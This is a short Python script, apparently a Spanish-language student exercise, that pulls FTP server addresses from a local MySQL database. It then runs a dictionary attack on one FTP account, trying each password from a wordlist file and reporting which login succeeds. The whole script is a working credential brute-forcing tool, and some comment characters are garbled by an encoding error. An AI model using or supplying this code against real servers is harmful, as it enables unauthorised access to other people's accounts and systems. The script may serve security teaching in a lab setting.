"""Desarrollo: Parte 2 - conexi칩n FTP usando un "Diccionario""""
import os
from ftplib import FTP
import mysql.connector as mysql

# Inicio del c칩digo
print ("Python conect치ndose a MySQL")

# Conect치ndose a MySQL
conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='compuservi' )
operacion = conexion.cursor()
operacion.execute( "select dir_ip from computadoras where servicio = 'ftp';")
for dir_ip in operacion.fetchall() :
      print (dir_ip)
conexion.close()
ip = str(dir_ip[0])
print(ip)

ip = ip
usuario = "mariggr"

print("Servidor FTP: "+ usuario + " HOST: "+ ip)
file = open("C:/Users/Maricarmen Gonzalez/diccionario.txt","r")
text = ""
for linea in file.readlines(): 
    text += linea
file.close()
textoSplit = text.split('\n')

print(textoSplit)
print("---------LONGITUD de DICCIONARIO----------")
print(len(textoSplit))
r = len(textoSplit)
for i in range(r-1):
    try:
        conexion = FTP(ip)
        conexion.login(usuario, str(textoSplit[i]))
        print("\nConexion --EXITOSA-- con clave: "+ str(textoSplit[i])+"\n")
    except:
        print("\nConexion FALLIDA con clave: "+ str(textoSplit[i])+"\n")